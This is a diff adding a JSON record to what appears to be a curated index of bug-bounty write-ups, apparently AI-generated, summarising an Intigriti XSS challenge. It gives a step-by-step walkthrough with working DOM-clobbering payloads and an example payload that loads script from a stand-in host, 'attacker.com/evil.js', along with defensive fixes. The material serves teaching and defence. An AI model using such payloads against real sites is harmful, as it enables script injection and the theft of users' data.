@@ -1,5 +1,45 @@
 [
   {
+    "id": "9827fd81ef45",
+    "title": "🏁 Intigriti BRP Challenge Write-up",
+    "url": "https://medium.com/@laftman/intigriti-brp-challenge-write-up-187eded7dfe9",
+    "source": {
+      "slug": "medium-tag-writeup",
+      "name": "Medium — #bug-bounty-writeup"
+    },
+    "authors": [
+      "⛧ Ⱡ₳₣₮M₳₦⛧"
+    ],
+    "program": null,
+    "platform_slug": "intigriti",
+    "bounty_raw": null,
+    "published_at": "2026-11-10T11:17:03.000Z",
+    "added_at": "2026-11-14T09:34:40.033Z",
+    "categories": [
+      "xss"
+    ],
+    "severity": "medium",
+    "difficulty": "intermediate",
+    "summary_en": "A reflected XSS vulnerability was discovered where an incomplete HTML sanitizer allowed an attacker to inject specific DOM elements that bypassed internal security gates, leading to arbitrary script execution and flag theft.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The vulnerability stems from a 'denylist' approach to security, where the application only blocked specific dangerous tags like <script> and event attributes like 'onerror'. It failed to account for the fact that 'id' and 'data-*' attributes could be used to manipulate the application's own logic. Because the application used the DOM (the browser's internal map of the page) to store security-sensitive configuration, an attacker could inject harmless-looking HTML that the application then used to programmatically load a malicious script.",
+      "walkthrough": "RECON\n1. The researcher identified the 'person' parameter in the URL, which is a piece of data sent to the website in the address bar.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=test\nWhy: This is the entry point for user input. (A parameter is a variable in a URL used to pass data).\n2. They observed that the input is placed into a 'sink' called innerHTML, which is a programming command that tells the browser to treat text as HTML code.\nholder.innerHTML = sanitizedValue;\nWhy: Using innerHTML is dangerous because it tells the browser to execute any code found in the string. (A sink is a function that can execute or render data).\n\nDISCOVERY\n3. The researcher tested if they could inject a simple bold tag to see if it rendered.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=<b>probe</b>\nWhy: This confirms the application treats the input as HTML (the language used to build web pages) rather than plain text.\n4. They tried a standard script tag to run JavaScript, but it was removed by a sanitizer, which is a filter that removes dangerous parts from user input.\n<script>alert(1)</script>\nWhy: The sanitizer uses a denylist to block specific tags like <script> (an HTML element used to run code).\n5. They analyzed the page's source code to find the 'gate' logic that controls script loading.\nconst latch = document.getElementById('archive-latch');\nWhy: The application looks for specific elements in the DOM to decide what to do next. (The DOM is the browser's internal map of the webpage).\n6. They found a check for a 'data-key' attribute, which is a custom setting inside an HTML tag.\nif (latch.dataset.key === 'river-lantern')\nWhy: The application only proceeds if an element with a specific ID and a specific data value exists.\n7. They found a second check for an element with the ID 'record-anchor' and a 'data-index' attribute.\nconst anchor = document.getElementById('record-anchor');\nWhy: This is a second security gate that must be passed simultaneously.\n8. They discovered that if both gates pass, the application creates a new script tag using the value from 'data-index'.\nconst s = document.createElement('script'); s.src = anchor.dataset.index;\nWhy: This is the final exploit point; the application trusts the 'data-index' value to be a safe URL.\n\nEXPLOITATION\n9. The researcher crafted the first required element (the latch) with the correct ID and key.\n<div id=\"archive-latch\" data-key=\"river-lantern\"></div>\nWhy: This satisfies the first security check without using any blocked tags.\n10. They crafted the second element (the anchor) pointing to a malicious endpoint, which is a specific URL on a server.\n<a id=\"record-anchor\" data-index=\"/echo.php?listener=alert(document.domain)\"></a>\nWhy: This satisfies the second check and provides the payload (the malicious code) to be loaded.\n11. They combined both elements into a single payload to bypass both gates at once.\n<div id=\"archive-latch\" data-key=\"river-lantern\"><a id=\"record-anchor\" data-index=\"/echo.php?listener=alert(document.domain)//\"></a></div>\nWhy: This payload contains only allowed tags and attributes, so the sanitizer lets it through.\n\nIMPACT\n12. The researcher loaded the final URL in the browser.\nhttps://challenge-brp.challenges.intigriti.io/challenge.php?person=[PAYLOAD]\nWhy: The browser renders the injected HTML, the application's logic sees the required elements, and it automatically loads the attacker's script.\n13. The script executed in the browser, triggering an alert and revealing the secret flag.\nalert(document.domain)\nWhy: This proves the attacker has full control over the website's behavior in the victim's browser.",
+      "example": "Imagine a website 'target.example' that lets you customize your profile header. It filters out <script> tags but allows <div> tags with IDs. The site has a 'theme loader' script that looks for an element with id='theme-config' and loads a file from its 'data-path' attribute. A vulnerable code snippet might look like: \n\nconst config = document.getElementById('theme-config');\nif (config) {\n  let script = document.createElement('script');\n  script.src = config.getAttribute('data-path');\n  document.body.appendChild(script);\n}\n\nAn attacker can bypass the script filter by providing this input: \n<div id='theme-config' data-path='//attacker.com/evil.js'></div>\n\nWhen the page loads, the 'theme loader' finds the attacker's <div>, reads the 'data-path', and helpfully loads the attacker's malicious JavaScript file.",
+      "takeaway": "When hunting for XSS, don't just look for blocked tags; look for how the application uses the HTML you *can* inject. If an application uses a denylist (blocking specific 'bad' things), it is almost always bypassable. Pay close attention to 'data-*' attributes and 'id' attributes, as these are often used by legitimate scripts to make decisions. A common beginner mistake is giving up when <script> or onerror is blocked, instead of reading the site's own JavaScript to see if you can 'clobber' or manipulate its logic using allowed tags.",
+      "fix": "The best fix is to avoid using innerHTML entirely and instead use textContent, which treats all input as literal text and never executes it as code. If you must render HTML, use a robust, allowlist-based library like DOMPurify that only allows a very narrow set of safe tags and attributes. Additionally, never use the DOM as a source of truth for security-sensitive data like script URLs. \n\nFixed code example:\n// Use textContent for safety\nholder.textContent = userInput;\n\n// Or use a proper sanitizer if HTML is required\nholder.innerHTML = DOMPurify.sanitize(userInput);",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "**Target:**`challenge-brp.challenges.intigriti.io`**Vulnerability class:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-Site Scripting) **Severity:** Medium **Result:** Reflected XSS leading to disclosure of the challenge flag ## 📋 Summary The `person` parameter of `challenge.php` is reflected into the DOM via `innerHTML` after a sanitization pass that strips dangerous tags and `on*` event attributes, but does not strip ordinary HTML elements or their data attributes. By studying the page's own client-side logic, it was possible to construct a payload built enti",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 47
+  },
+  {
     "id": "53f914854eb4",
     "title": "The Jail That Gave Its Prisoner a Staff Badge: Escaping WordPress Playground’s Sandbox",
     "url": "https://medium.com/@mohamed.adel.887275/the-jail-that-gave-its-prisoner-a-staff-badge-escaping-wordpress-playgrounds-sandbox-db7e8eb89a9f",
